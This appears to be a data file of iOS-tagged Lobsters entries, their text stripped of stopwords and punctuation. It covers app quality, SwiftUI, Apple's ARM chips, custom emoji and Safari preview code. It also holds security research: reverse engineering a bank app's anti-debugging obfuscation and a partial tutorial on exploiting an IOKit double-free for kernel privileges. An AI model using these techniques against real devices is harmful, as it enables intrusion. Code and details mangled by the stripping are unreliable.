drop used reordering app support drag make new window data could copied moved inserted duplicated also via drag drop make sense data shared via airdrop natural language processing support necessary tab bar image vector pdf image corresponding size included ensure adapt correctly vended accessibility modal properly displayed live photo animate force touched utilize phlivephotoimageview playback system specific feature live photo arkit experience use system badge indicate available ie live photo arkit badge make sense support printing via uiprintinteractioncontroller call uigraphicsbeginimagecontextwithoptions uigraphicsimagerenderer used instead universal link supported especially app content available online need secure data opt user touch face id vend useful interaction current context via uiactivity uiactivityviewcontroller relevant app supply app clip use system capability arkit lean platform defined convention help user get started example get arkit experience started typically use arcoachingoverlayview instead rolling solution finally running analyze function xcode yield error warning suggestion user experience top mind support native undo redo action typically shaking system defined gesture content type text view text field included correct keyboard type used current context keyboard language identifier integrated correctly support two finger drag edit gesture table collection view using custom input view place keyboard provide audible tap noise using uideviceplayinputclick got customized text input support uiscribbleinteraction customized back button image navigation controller also set backindicatortransitionmaskimage searching capability support field token handle keyboard undocked ipad view constrained via inputaccessoryview data quantifiable data transfer occurring progress indicator used activity indicator localized territory released text tends truncate never clip rather always readable tappable interface element least point entire app binary megabyte source based multitude data point delete action always followed confirmation prompt app store rich information file like keynote presentation us quick look api preview robust nsuseractivity support state restoration handoff drag drop creating new window core spotlight donating siri inintent us correct audio setting responds audio interruption gracefully audio played within custom edit option supported text image selected appropriate user provided ample time form opinion app request rating opt builtin skstorereviewcontroller ask launch screen branding free closely resembles first screen app displaying video using avplayerviewcontroller player display content original aspect ratio include extra padding around frame would cause video appear smaller fullscreen fittoscreen mode opening link could lead another app web view sfsafariviewcontroller try calling uiapplication openurl uiapplicationopenurloptionuniversallinksonly option first table view deselect selected row viewdidappear popping back loading data let user know progress operation either using determinate indeterminate view notification supply value hiddenpreviewsbodyplaceholder detail view also consider using short memorable sound make sense notification using unnotificationsound supply detail view expand context notification user accomplish task within notification without open app good thing also let user edit notification preference within app uitextinputassistantitem item used support common task ipad home within shortcut bar performing crud operation table collection view opt animate change using diffable datasource instead reloaddata testing leak freed memory part workflow consuming unnecessary amount memory power hamper everyone long running task keep ui free date using background task using system material accompany content contained within matching vibrancy effect ie mix match different semantic effect tend use system semantic color instead hard coding custom color adapt light dark mode increased contrast transparency reduction scenario also use semantic color consistent way redefine meaning ie use link label color defer providing custom gesture towards edge screen appropriate viewing medium override preferredscreenedgesdeferringsystemgestures needed user interface element constrained keyboard frame handle situation may undocked floating split support pencilkit include undo redo button compact environment additionally ensure systemwide double tap gesture modify content customized app navigation clear foolproof use either flat hierarchical contentux driven navigation use sidebar flatten information hierarchy make sense example app several folder playlist similar collection use tab bar aim item need tab likely going wrong direction modality used sparingly clearly brings back dismissed design also considers text app voice messaging part design experience stay consistent mix playful error message juxtaposed serious one io technology technical term made anyone understand ie use scan tag instead activate nfc reading session similar design drip polish correct system margin used throughout app hard coded one used ie layoutmarginsguide safearealayoutguide etc haptic feedback used throughout system complement user interaction overdone right haptics used right time example use selection selection change instead something like rigid example often accompany visual auditory feedback utilize sf symbol common io glyph apps running io later show dedicated one system apis ie glyph exclusively icloud usage use custom one custom glyph adapt well environment controller transition feel natural fluid great example calendar photo opt vector asset combat differing resolution avoid blurry asset content always focus constantly challenge true throughout development cycle particular specific user experience guideline followed segment control used toolbars five le option toolbars tab bar screen destructive action top choice action sheet alert used ideally two choice title punctuation avoid using yes choice need two choice opt action sheet picker height equal list value progress indicator bar unfolded portion track clear otherwise colored denote amount work left network activity indicator shown network request last second popover iphones avoided discard work user actively tap cancel button example someone tap outside popover work saved switch exclusively used within table list style collection view row page control always centered bottom screen aspire ship apple platform io iphone ipad watchos tvos macos animation tasteful reinforce introduce action confusing likely mimic real physical law general reduce modality possible keep focus content supply highresolution asset image use right asset format given scenario png icon bitmapraster artwork jpeg photo pdf glyph vector artwork controller specific configuration thoughtfully implemented status bar hidden exchange equal value pointer locking occurs boost experience home indicator hidden rich medium experience full width button respect uikit margin extend edge edge screen color used denote value purpose provide mixed signal example enabled disabled control colored red triangle conveys problem red used everywhere else app create rich medium apps apps primarily used reading watching provide sensible value uiwhitepointadaptivitystyle adjust along true tone handle color management well ensure color display fine srgb device app voice use consistently example app strike formal tone display error message text overtly place humorous opt lean system font better support size improve legibility consistency custom font provides value direct purpose used system font also work weight dynamic type size lastly app jank free know mean app store page logistical asset thoughtfully crafted app store preview video used keywords category carefully researched link privacy policy provided supported territory localized app icon follows golden grid likely include brand primary color well embrace simplicity conveys app main idea supply size needed spotlight setting etc otherwise io shrink app store icon ideal wrapping love checklist quality checklist constantly evolving one main reason created spend stack see could get state meet exceeds almost every single bullet point certainly quality take time nailed everything list working towards year close meeting item listed stress also mean probably shipped take piece piece work way wise honeyloving bear said get going walking away app might lack polish better ever spend time giving next time
29,Lobsters,ios,Apple iOS,The Promise vs Reality of SwiftUI Multiplatform,https://write.as/angelo/the-promise-vs-reality-of-swiftui-multiplatform,promise v reality swiftui multiplatform,last week post tweeted letdown swiftui illustrated broken button reality multiplatform via r,happy august friend update last week post swiftui app writefreely work progressed pretty well shared code last week point got preliminary ui display list post filter collection tapping post load editor make change title content iphone ipad also new post button create new draft iphone ipad well pull chair let chat little bit gap promise reality multiplatform swiftui apps working post tweeted managed flesh key ui feature app across iphone ipad mac day thanks swiftui live preview xcode show view look like next code update realtime code stated building native app speed iteration ever encountered building web looking html cs looking react latest iteration look like far iphone ipad installed macos aka big sur beta able build mac app compare way final ui plenty work still done including replacing unusual picker view selecting collection proper sidebar adapting spacing little better mac app ca nt preview anything mac target even xcode upgrade machine macos beta one thing helpful moving quickly swiftui declarative nature let specify semantics element placement view letting framework figure mean iphone v ipad v mac great example focus developer experience dx toolbaritemplacement api let semantically state particular item add toolbar primaryaction status element used texteditor view place post status badge status area publish button primaryaction area see screenshots shared element placed differently depending whether shown iphone ipad mac nt write single line code customize difference letdown swiftui illustrated broken button life swiftui rose newdraft feature nt quite working fully yet building iphone ipad version app tapping newdraft button list post work beautifully slide new draft list open text editor next great essay thrilled working end workday friday finished installing big sur beta mac morning excited see everything looked worked mac app expected little ui refinement list post example need healthy dose padding otherwise figured similar experience least ipad app mostly picker replaced popup menu choose collection narrow list post tap post list load text editor ready change post status change instantly update badge toolbar post list tried create new draft mac clicking newdraft button appears interestingly enough next poststatus badge screenshot nothing thing error thrown view drawn nothing reality multiplatform suppose nt use word letdown multiplatform panacea reality app expects different thing iphone ipad mac issue facing newdraft button nt failing swiftui paradigm mac app treat navigation v button v instantiating new window different iphone nt structured thing way framework expects fine need spend little time adapting mac client would liked got say despite couple little issue need fix really impressed much worked right box extra work part nativeapp development may yet happen pace web development closer ever enter email subscribe update also subscribe via r follow angelo writeas mastodon
31,Lobsters,ios,Apple iOS,"Apple, ARM, and What It Means",https://www.ifixit.com/News/42949/apple-arm-and-what-it-means,apple arm mean,htomariflickr note syonyk project blog apple transition arm possibility apple moving arm processor apple modern phone processor started giving intel offering solid competitor really happened arm huh instruction set architecture powerpc powerpc intel opcodes quite riscv intel amd power netbooks intel sdm arm small powerefficient cheap good enough apple arm big powerefficient intel stuck broken microarchitecture process slipped yet broken term security netburst sgx enclave terminal faultforeshadow apple arm advantage security processor shipping carryon luggage roughly nowhere arm emulation rosetta provide integrated emulation virtualization goodbye native window performance mikrotik winbox software ecosystem yay raspberry pi raspberry pi raspberry pi jetson nano intel future moore law iphone review,photo htomariflickr note guest post russell graf writes computer project syonyk project blog edited version post apple transition arm found interesting view necessarily represent ifixit past year apple mac run intel processor using architecture competing pc meanwhile apple used arm processor mobile device ever since first iphone apple often seemed stymied intel slower pace innovation compared large stride mobile power year people discussing possibility apple moving arm processor desktop laptop reinvention read like something open question sure thing ever since apple modern phone processor started giving intel offering solid competitor really happened apple use custombuilt arm processor power macbooks point probably imacs mac pro lot people seem confused really mean know way around deep processor weed interesting ton uninformed garbage internet usual offer attempt clarify thing arm huh apple third major instruction set architecture isa transition history moved powerpc powerpc intel arm make pretty much consumer hardware company regularly change processor architecture certainly largest pull consistently instruction set nearly lowest level language processor speaks defines opcodes execute gut processor quite throughout history computing adding two number loading value memory deciding instruction execute next talking external hardware defined isa modern world consumer computing two matter though arm sorry riscv yet recently division simple processor intel amd ran desktop laptop server arm processor ran phone tablet printer everything else except loon like insisted reason making little arm computer function desktop thing worked anymore intel amd power decade king performance hill chip intel amd within rounding implementation pentium core athlon xeon powerhouse run office application run game run giant datacenters run internet fast powerful intel king though amd made proper nuisance regular basis fact extension probably running developed amd licensed intel powersipping atom processor netbooks massive xeons opterons data center covered default long desktop server people even think isa year old introduced accumulated lot cruft baggage year instruction maddeningly complex sort weird corner nasty gotchas gotten worse time mmx sse vmx tsx sgx txt smm stm either idea shuddering bit internally add go read intel sdm fun bored enjoyable also pretty darn complicated arm small powerefficient cheap historically arm architecture lowerpower far cheaper powerefficient alternative set fairly small cheap make powerefficient focused blazingfast performance usually good enough result ended everything desktop laptop last year two arm chip started firing solid cannon blast across bow intel xeon chip datacenter care raw singlethreaded performance care awful lot total throughput power efficiency arm server chip properly impressive le money xeon computing power fewer watt bad arm chip made way laptop desktop threat flagship performance intel apple occasion totally insane interesting way apple arm big powerefficient fast company license arm reference core etc attach desired peripheral resulting arm chip run fast company arm chip core clock rate company proper license engineering staff build totally custom arm core apple one company starting processor iphone used custom processor implementation arm processor sure reference arm processor implementation first fairly impressive time clearly phone chip meant save power run cool apple got crazy iphone probably faster anything else house term singlethreaded mere watt apple quietly iterating custom arm core created something properly barely anyone noticing meantime yeah review score got impressive year yeah modern android device stomped iphone anything massively phone threaten desktop laptop laptop far thermal capacity power offer one apple chip phone iphone battery working new macbook pro battery making time larger go screen good bit power throw computing plug computer well power problem interesting also intel found stuck intel stuck broken microarchitecture kept intel last year none surprise might notice seem produce strikingly similar processor every year sometimes month intel stuck process year plan slipped yet microarchitecture fundamentally broken term security worse fully understand chip anymore yes intel iterating releasing improvement okay made last two everyone else leapfrogged intel used unquestioned lead rest tech industry building chip showed intel chip post netburst used le power gave performance anything else solid chip performed well worth money case lost lead lost lead previous chip getting slower age might heard meltdown spectre camel nose laundry list issue recently discovered flaw microcode update software recompilation kernel workarounds workarounds slow processor haswell processor today run code slowly came whoop finally intel reason chip anymore seem unable fully understand chip know know quite regularly microarchitectural vulnerability come rip open secure sgx worst terminal faultforeshadow fix cache enclave transition hit processing speed dealbreaker point intel know problem told would want chained intel anymore good reason amd caught apple move one thirdparty vendor another pulling interesting apple arm advantage custombuilt arm chip give apple better control stack translate rather nicely better user experience least user apple able deliver performance le bargain able integrate stuff chip even power saving need separate security processor build main processor die stuck dealing whatever integrated gpu abomination intel dumped generation design chip need hardware acceleration stuff care yes know intel bad used sincerely doubt apple happy integrated gpus fewer chip also mean smaller generally mean le power consumption better performance important ever apple literally sitting limit much battery laptop claim laptop disclaimer might ask wrong battery warrant disclaimer saying actually le lot shipping carryon luggage regulation use usually phrased le apple explicitly clear laptop le advertise equal usps shipping ups something say battery ship battery essentially declare hazardous material customerfriendly scene apple literally put battery laptop expect ship inexpensively let people travel easily way increase runtime reduce power use apple arm chip almost certainly use le power intel chip work apple might keeping tradition use custom chip offer smaller lighter laptop battery nobody else touch either way bold move set apart rest industry stuck intel longer microsoft arm ambition gone roughly nowhere linuxonly hardware big seller outside chromebooks apple also gain lot able put stuff io device laptop think machine learning accelerator neural network engine speech recognition gap iphone macbook pro ought narrow significantly might even see return laptop builtin cellular modem arm emulation sticking point apple switching arm first foremost current mac based happens existing software switching arm mean software work without translation turn apple massive amount experience exactly sort thing made binary run fine powerpc made powerpc binary run acceptably rosetta provide integrated emulation emulating hard especially want fast lot work time jit space thing like javascript apple emulation expect jit engine used infrequently real performance come binary binary source code get turned arm binary let figure weirder feature like flag register updated every instruction needed ignored one could also bit work figure arm rather relaxed memory model compared cause problem build barrier easy certainly type thing apple done sound like rosetta continue trend would interesting though think apple might pull would going native library call recompiling program know code going call apple library function got bit creative emulated software could jump emulated application code native library code would gain lot performance back thing apple library lot would native performance virtualization goodbye native window performance next question least subset user virtual machine well arm support virtualization want run linux vm run arm linux vm need application say window interesting watch fully expect solution year ago ran window powerpc hardware know sort performance get full system emulation arm normally thing gone way emulate slow arm system fast machine performance great good enough going way though nobody really tried never really fast arm chip mess course apple chip faster comparable intel chip spend time emulation maybe come even ahead hoping run weird utility mikrotik winbox come mind sort thing run sure good enough solution maybe light fire microsoft fix arm version window emulator game probably sorry software ecosystem yay though really excited something almost nobody else care software ecosystem going get fixed fast playing arm desktop pi raspberry pi raspberry pi jetson nano swell interest use raspberry pi armbased chromebooks similar device made living arm tolerable daytoday livable stuff though software build randomly fail clearly little development polishing end thing like signal building arm ancient dependency nested inside node dependency know mean apple moving highend arm space expect fast great news light arm system even personally macbook intel future leave intel depends bit good apple soon intel get back track intel iterates quickly get process working fix underlying microarchitecture properly instead using university r dqa lab good decade back forth apple team excellent intel well used excellent least certainly got resource throw crash headlong brick wall end moore law getting creative ideally way leak secret going important could end something like state phone anandtech iphone review benchmark latest flagship web performance top go apple apple previous generation apple generation big gap rest pack yes mention iphone desktop grade chip term spec benchmark performance could laptopdesktop market look bad probably possibility really depends apple chip designer waiting wing someone finally said watt play apple moving away intel data center working arm option cheaper buy cheaper run faster bargain intel might hard hill may make back
32,Lobsters,ios,Apple iOS,Reverse Engineering Starling Bank (Part I): Obfuscation Techniques,https://hot3eed.github.io/2020/07/30/starling_p1_obfuscations.html,reverse engineering starling bank part obfuscation technique,reverse engineering starling bank part obfuscation technique control flow obfuscation technique opaque predicate done right instruction alias instruction substitution function inlining data flow obfuscation technique multiple stack pointer register literal tunneling deal manual approach singlestep way poor man frida stalker next,reverse engineering starling bank part obfuscation technique uk bank seem earned reputation tight starling one good example launch starling binary version io jailbroken device debugger crash could tell crashlog gon na interesting binary exception type excbadaccess sigbus exception subtype kernprotectionfailure exception code culprit unknown vm protection rw triggered thread thread name dispatch queue comapplemainthread call stack libdylddylib start strange callee dyld start crash binary look like heap address besides quirk backtrace also bit misleading see later first decrypt binary launch luckily let try see happens main need spawn binary debugger first lldb debugserver x backboard starling lldb b mainaddr lldb c binary stop main good continuing expected crash process stopped thread queue comapplemainthread stop reason excbadaccess frame udf udf udf crash strange heap pointer let see backtrace lldb bt thread queue comapplemainthread stop reason excbadaccess frame frame starling starling frame libdylddylib start crashlog misleading see point binary crash happens good somewhere least instruction tell gon na considerably obfuscated let see block leading crash ldr adrp add add str blr safely assume happens something environment ie debugger jailbreak trigger something function logic trigger get know met strong arsenal obfuscation technique control flow obfuscation technique opaque predicate done right opaque predicate staple obfuscation highprofile apps reversed rarely done right usually inserted identical selfcontained block block original code become easy recognize play binary short binary different beast identical selfcontained make extensive use stack variable always clear anymore whether branch taken due opaque predicate legit constraint binary snapchat opaque joke compared let see real example mov stur b couple block later ldur str sub sub cset lt strb mov practically dead code str opaque predicate start b somewhere finally decision made ldr str sub sub blt somewhere never taken b somewhere always taken add enough becomes considerably hard distinguish original code behaviordata solution execution trace see later easy usually instruction alias lookup cmp page find alias sub subtract set flag tst ands instead giving conveneince understandable alias give original one sub ands know else big deal anyway instruction substitution another popular technique substitute simple instruction others semantics example str xzr ldr noticed equivalent movz function inlining function inlining another popular technique good job function work control data flow obfuscation basically blur line function instead convenient one container reverse engineered know normal function great help argument return value give hint function could plus reverse function one context normally reverse another context technique definitely made function way harder work data flow obfuscation technique team starling seems focused hiding stack variable right thing function like multiple stack pointer register stack offset useful identifying variable interested seeing action usually sp register used access stack variable binary though couple register used hide offset happens multiple base actually pointer offset used access value would change add sp add sp two instruction usually separate block far away one convenience add bl somefunc let access via ldr solution watchpoints address remains although using binary analysis frameworkemulator resolve nonsp stack pointer would cool easy literal tunneling know technique already name let coin call tunneling similar tunneling protocol important return value syscall example obviously gon na check want check trivial bypass store stack offset couple block later load store another stack offset block later since block sequential memory hard tell check made original value unless using debugger looking execution trace example svc mov stur retval redacted block logic ldur retval stur retval b somwhere couple block later ldur retval stur retval redacted block logic decision finally made ldur retval redacted logic cbz somewhere retval redacted block logic simplicity binary block come clearcut deal manual approach working binary like begin understand done usually idea deobfuscate using symbolic execution tainting slicing fancy reverse engineering time management usually delay investing time find manual approach time intensive almost always manual approach win make progress resorting approach binary exception manual mean debugger disassembler possibly execution trace singlestep way obfuscation mind two thing contribute making function quite tricky reverse opaque predicate function inlining string obfuscated opaque predicate used heavily maybe halfish instruction bogus loop check considerable amount file find swimming sea assembly opaque predicate usual way singlestepping reversing c practical frida stalker would naturally way go poor man frida stalker tried spawn starling using frida script stalk main crashed expected give execution trace crash wanted frida u f ukcostarlingbankstarling l mainstalkjs iphone ukcostarlingbankstarling resume crashlog iphone ukcostarlingbankstarling started stalking main process crashed bus error thought write atrocious singlestepper python plugin lldb log instruction terribly slow execution trace huge huge fact impractical log whole thing one go gave wanted wonder much faster plugin would might bad idea could even call creep next jailbreak debugger detection technique weakness mitigation
33,Lobsters,ios,Apple iOS,Replicating Safari's Link Preview Animation,https://shadowfacts.net/2020/uipreviewparameters-textlinerects/,replicating safari link preview animation,snapshot view mask,io apple replaced peek pop force touch system new context menu preview new preview fancy animation appear expand content onto screen back first replaced preview tusker new context menu year ago shortly wanted replicate behavior safari link mention post body time pretty much zero official documentation new context menu apis decided wait either apple publish doc someone else figure first come gone working little bit time year finally fully working implementation safari behavior look like animation slowed singleline link one span multiple line look pretty much like expect singleline case text link appears inside sort bubble animates link preview multiline link pretty similar two bubble contains part link respective line text fragment overlapped horizontally two bubble would merged together default nt provide custom preview uikit simply display entire view animation nt look great particularly long piece text link may small portion highlighting link text look much better let see take reimplement behavior safari first little bit custom preview work contextmenuinteraction previewforhighlightingmenuwithconfiguration method provide custom uitargetedpreview describing configuration preview take view displayed preview preview parameter object preview target object preview parameter describe preview displayed preview target defines view preview view within inside view anchored previewforhighlightingmenuwithconfiguration method need construct assemble targeted preview obvious starting place uipreviewparameters textlinerects initializer since directly deal behavior trying replicate take array cgrects wrapped nsvalues representing rectangle occupied text one rect per line text coordinate space preview view uitextview subclass coretext stack already setup directly access nslayoutmanager handy method called enumerateenclosingrects forglyphrange withinselectedglyphrange take range text give u access rectangle text occupies use method need get link range somewhere since context menu interaction previewforhighlightingmenuwithconfiguration method could ask location within ourself find link range point would duplicating work done almost immediately contextmenuinteraction configurationformenuatlocation method instead store link range private property text view subclass configurationformenuatlocation method retrieve previewforhighlightingmenuwithconfiguration code assumes already exists method called getlinkrangeatpoint take point inside text view return range link span one private var currentpreviewedlinkrange nsrange func contextmenuinteraction interaction uicontextmenuinteraction configurationformenuatlocation location cgpoint uicontextmenuconfiguration guard let range selfgetlinkrangeatpoint location else return nil selfcurrentpreviewedlinkrange return contextmenuinteraction previewforhighlightingmenuwithconfiguration method grab stored range get creating preview returning nil method simply use default preview configuration showing entire text view preview animation reasonable fallback reason link range func contextmenuinteraction interaction uicontextmenuinteraction previewforhighlightingmenuwithconfiguration configuration uicontextmenuconfiguration uitargetedpreview guard let linkrange currentpreviewedlinkrange else return nil currentpreviewedlinkrange nil link range use enumerateenclosingrects method text view layout manager use rectangle construct preview parameter object let notfoundrange nsrange location nsnotfound length var textlinerects cgrect selflayoutmanagerenumerateenclosingrects forglyphrange linkrange withinselectedglyphrange notfoundrange selftextcontainer rect stop textlinerectsappend rect let parameter uipreviewparameters textlinerects textlinerects nsvalue finally got text line rects preview parameter move next piece puzzle view going shown preview animation might think could use self preview view work animation running preview view removed regular view hierarchy meaning rest text would disappear animation running since later use self target preview preview even appear could try duplicate ourself copy layoutimpacting attribute asking slight layout difference instead ensure get view appears exactly text view use snapshot view guard let snapshot selfsnapshotview afterscreenupdates false else return nil next need create preview target reading documentation might notice uitargetedpreview view parameter initializer wonder even necessary well try use initializer snapshot view app crash snapshot view added view hierarchy therefore target uikit know put uipreviewtarget describes exactly need know container view preview placed simply self since text view well inside target container center preview anchored want anchor center point preview view text link appears exact place text line rects determine overall bound link text fragment since preview bounding rectangle link text use center rect enclosing text var minx cgfloatgreatestfinitemagnitude maxx cgfloatgreatestfinitemagnitude miny cgfloatgreatestfinitemagnitude maxy cgfloatgreatestfinitemagnitude rect textlinerects minx min rectminx minx maxx max rectmaxx maxx miny min rectminy miny maxy max rectmaxy maxy let textlinerectscenter cgpoint x minx maxx minx maxx let target uipreviewtarget container self center textlinerectscenter finally construct return targeted preview return uitargetedpreview view snapshot parameter parameter target target run preview animation limited text link look pretty good unfortunately still pretty big problem link near enough text particularly span multiple line text visually near link partly visible preview happens uikit take text line rects passed uipreviewparameters stuff expand round corner merge creating bubble shape mask preview view resulting path unfortunately mask text beforehand mask everything one pas need giving uikit preview view mask directly around text preventing anything else seeping something similar uikit need generate path contains entirety text line rects nothing note convex hull problem since need path contains point rectangle need smallest path encloses implementing particularly interesting left exercise reader assuming custom initializer uibezierpath wrappingaroundrects produce path array cgrects obvious thing mask view path using layer mask cashapelayer let path uibezierpath wrappingaroundrects textlinerects let masklayer cashapelayer masklayerpath pathcgpath snapshotlayermask masklayer running however quite work everything look exactly nearby text appearing inside preview animation might check documentation think try visiblepath attribute uipreviewparameters unfortunately entirely override mask generated textlinerects initializer exact opposite current problem seems using uipreviewparameters textlinerects initializer uikit silently discard existing layer mask view provided preview view also true uiview mask caused great deal hairpulling disabled preview parameter stuff mask suddenly started working simple workaround apply mask snapshot view embed snapshot inside additional container view size use container view uitargetedpreview let snapshotcontainer uiview frame snapshotbounds snapshotcontaineraddsubview snapshot return uitargetedpreview view snapshotcontainer parameter parameter target target link text visible preview animation expands nicely full preview video metadata masked style width margin auto display block title screen recording link previewed dismissed link text animating back starting position upon dismissal still one small detail keeneyed reader may noticed safari dismissing full preview animates back preview view spring back original position implementation however preview view controller animate back preview view however instead returning original position disappears middle screen still one uicontextmenuinteractiondelegate method need implement contextmenuinteraction previewfordismissingmenuwithconfiguration similar previewforhighlighting method method take interaction context menu configuration creating uitargetedpreview used dismissal animation since want preview go back location dismissing came expanding cache targeted preview already constructed highlight method return dismissal method private weak var activetargetedpreview uitargetedpreview func contextmenuinteraction interaction uicontextmenuinteraction previewforhighlightingmenuwithconfiguration configuration uicontextmenuconfiguration uitargetedpreview let preview uitargetedpreview view snapshotcontainer parameter parameter target target selfactivetargetedpreview preview return preview func contextmenuinteraction interaction uicontextmenuinteraction previewfordismissingmenuwithconfiguration configuration uicontextmenuconfiguration uitargetedpreview return selfactivetargetedpreview dismissing preview animates back link text originally came
34,Lobsters,ios,Apple iOS,Streamoji is a custom emoji rendering library for iOS,https://github.com/getstream/streamoji,streamoji custom emoji rendering library io,stream usage define emojis configure uitextview example installation cocoapods author cardoso matheus getstreamio license,custom emojis fun way bring life customizability apps available popular apps slack discord twitch however io sdk nt provide straight forward support custom emojis box couple code line away adding app library streamoji custom emoji rendering library io support gif image unicode load url local asset caching taken care performance fast made folk stream usage define emojis first step define custom emojis dictionary key shortcode emoji emojisource uhmmm source emoji gif image local asset remote url even unicode character also define alias alternate code let exampleemojis string emojisource babyyoda imageasset babyyodasoupgif bananadance imageasset bananadancegif excuseme imageasset excusemegif partyparrot imageasset partyparrotgif thisisfine imageasset thisisfinefiregif imageasset whatpng homerdisappear imageasset homerdisappeargif letmein imageurl http githubcomgetstreamstreamojiblobmainmetaemojisletmeingif rawtrue smiley character heart character banana alias bananadance parrot alias partyparrot configure uitextview defining emojis call uitextviewconfigureemojis textviewattributedtext nsattributedstring string bananadance streamoji partyparrot babyyoda uitextview excuseme support gif thisisfine image local file homerdisappear remote file letmein unicode smiley textviewconfigureemojis exampleemojis rendering highestquality also tweak couple rendering option quality scale relation surrounding text example run example project clone repo run pod install example directory first installation streamoji available cocoapods install simply add following line podfile author cardoso matheus getstreamio license streamoji available mit license see license file info
35,Lobsters,ios,Apple iOS,Apple Security Research Device Program,https://developer.apple.com/programs/security-research-device/,apple security research device program,applying program initial application period end august applicant receive response end august apply,applying program start application sign apple id associated apple developer program membership enrolling organization need authority accept legal agreement behalf organization need list name everyone access security research device approved apple individual acknowledge responsibility initial application period end august receive response end august apply
36,Lobsters,ios,Apple iOS,Writing an iOS Kernel Exploit from Scratch,https://secfault-security.com/blog/chain3.html,writing io kernel exploit scratch,writing io kernel exploit scratch introduction article series github job test environment http opensourceapplecom http ipswme bug analysis iokit reversing iokit driver opensourced xnu kernel presentation stefan esser bug exploitation triggering bug exploitation kalloc zone spraying via iosurface object one freebsd hitb presentation ziva creating information leak spray dangling port pointer zone garbage collection controlling targetport creating kernel task port elevate privilege conclusion step acknowledgement ian adam ben siguza stefan luca marco,writing io kernel exploit scratch posted july introduction august ian beer samuel google project zero published comprehensive article series several exploit chain professional threat actor target io user describes full detail exploit chain series good starting point writing custom exploit mentioned vulnerability writing full exploit without experience io overwhelming task though actual vulnerability well described many obstacle way example exactly vulnerable function triggered even deploy debug exploit code moreover described vulnerability exploited several technique need chained together order get full access system required information io exploit developer aspirant scattered many article book presentation therefore aim blog post take one described kernel vulnerability write exploit scratch collect background information development process cohesive article could act reference beginner article structured follows first step step required set test environment outlined subsequently vulnerability trigger analysed detail also includes short introduction iokit driver along accompanying reverse engineering process initial trigger vulnerability described remainder article show develop full exploit using common technique used io exploit stepbystep particular article investigate chain original article series focus kernel exploit vulnerability introduced io mitigated io last version release also doublefree vulnerability seems like good choice get first contact io without knowing much detail several subsystem sandbox escape original chain investigated instead exploit us technique revealed recently siguza moreover noted neither full jailbreak implement postexploitation technique inthewild exploit chain due nature article discussing exploit already described ian beer content overlapping original article however intention article fill possible potential gap might occur exploit developer new io many described technique applicable current io version well mitigated currently though hope article good starting point io exploit developer aspirant nevertheless find source code github one last thing diving exploit enjoy stuff like might want check job page time publishing hiring test environment researching io requires xnu open source part kernel well io kernelcaches former found http opensourceapplecom latter could found http ipswme development exploit iphone io used iphone using vulnerable driver io version work suggested use mac xcode installed build system xcode free signing identity iphone development needed execute security findidentity terminal find fingerprint identity copy fingerprint makefile value variable signingid possible use jailbroken iphone development strict requirement jailbroken advantage sandbox escape needed order run exploit code delivered article simple remove application overhead turn function exploit source code main function copy correct entitlement via ldid binary iphone copy binary application start app via ssh jailbreak available following approach may used export certificate identity file read openssl using following command terminal security export identity f cert k loginkeychain openssl cert search iphone development certificate copy value ou team identifier copy value xxx file entitlementsplist file already format needed exploit sandbox escape exploit ready building installation build exploit make install ideviceinstaller directory case fails might want build install demo application via xcode trust developer certificate via setting app iphone possible install exploit application well run debug device support file correct io version needed found instance github obtaining file open two terminal window first window run idevicesyslog grep command print debug message exploit second window run ideviceimagemounter developerdiskimagedmg idevicedebug exploit start iphone debug message appear first terminal window bug analysis already described introduction ian beer covered important detail bug depth article series however someone new io exploit development might several question actual reverse engineering exploitation process vulnerability aim post explain exploit development process scratch section article address kernel vulnerability also cover several fundamental important iokit vulnerability present iokit driver iokit collection several resource framework library streamline process device driver development iokit driver developed subset c complicates reverse engineering process lead specific vulnerability exploitation technique iokit driver socalled kernel extension io kernel prelinked kernelcache binary information extension available prelinkinfo segment kernelcache modern disassemblers like ida pro ghidra aware article important aspect iokit driver give attacker interface kernel space every iokit driver provides one ore socalled user client provide external method user space process comparable system call seems natural research driver order exploit kernel many researcher past snag though many user client accessible sandboxed process hence kind sandbox escape often required first true bug exploited article well ian writeup discus escape leverage vulnerability accessible web process already mentioned introduction exploit described blog post utilise technique published siguza later reversing iokit driver bug discussed identified kernelcache ian beer used kernelcache image io beta available public anymore apple incidentally published fully symbolized kernelcache actually symbol stripped removed download completely therefore article give short introduction manually reversing iokit driver like stated previous section iokit user client provide external method user space process comparable c vtables function pointer method defined table const section text segment table array function pointer though ioexternalmethoddispatch structs struct defined iouserclienth opensourced xnu kernel struct ioexternalmethoddispatch ioexternalmethodaction function checkscalarinputcount checkstructureinputsize checkscalaroutputcount checkstructureoutputsize besides actual function pointer ioexternalmethodaction function several size field struct size field serve purpose describing size input output value respective ioexternalmethodaction indepth description value provided later article order identify external method iokit driver one use following approach every user client implement virtual method externalmethod take function pointer table call actual method via dispatch method external method table stored const section externalmethod contains hardcoded pointer table therefore aim first identify externalmethod implementation respective iokit driver inspect external method table actually possible reconstruct complete iokit user client tree described presentation stefan esser however also possible easily find externalmethod specific iokit driver manually every iokit user client class called meta class meta class constructed object instance user client constructed constructor meta class object expects name actual class argument therefore searching iokit user class name possible find method meta class user client constructed article corresponding class name method found searching reference string meta class constructor osmetaclass called pointer method table meta class stored object vtable actual iokit user client object located meta class vtable following pointer reveals iokit user vtable already mentioned every iokit user client implement externalmethod done overwriting method parent class iokituserclient needed compare vtable one iokituserclient already identified disassembler iokituserclient method remaining symbol io kernelcache method different function pointer vtable overwritten method one externalmethod externalmethod contains pointer external method table user client seen following image needed identify vulnerable function exploited article bug little primer enough research bug vulnerability present one external method found identified external method table discussion recap explanation given ian beer writeup first method method table called createdecoder second one called destroydecoder could identified reverse engineering method simply using symbolized io beta kernelcache actual usage method interest driver something video decoding acceleration interested though former method allocates small memory chunk store pointer user client destroydecoder method deallocates chunk fails nullout pointer classical doublefree vulnerability occurs turned useafterfree vulnerability allocation observed one call made createdecoder function shown following code excerpt allocatememory thiscall allocatememory allocinstruct allocoutstruct kernreturnt ret kernmeminfo tmpmem kernmeminfo allocinstruct smdlog assert broken n allocinstruct return bzero tmpmem kernmeminfo iomalloc bzero allocoutstruct tmpmem ret allocatekernelmemory allocinstruct surfaceid ulong allocinstruct allocinstruct allocinstruct task msvdxclientmeminfo allocoutstruct tmpmem prev kernmeminfo next tmpmem tmpmem return ret allocatememory directly called createdecoder line byte chunk allocated line pointer chunk saved user client object line line old pointer struct saved double linked list one would assume destroydecoder would simply free allocated chunk associated former created decoder indeed observed next excerpt deallocatememory longlong deallocatememory tmpbuf longlong retvalue kernmeminfo prev kernmeminfo kernmeminfo nextsprev kernmeminfo tmpbuf kernmeminfo retvalue else retvalue deallocatekernelmemory prev prev prev kernmeminfo prev next next head last next prev next 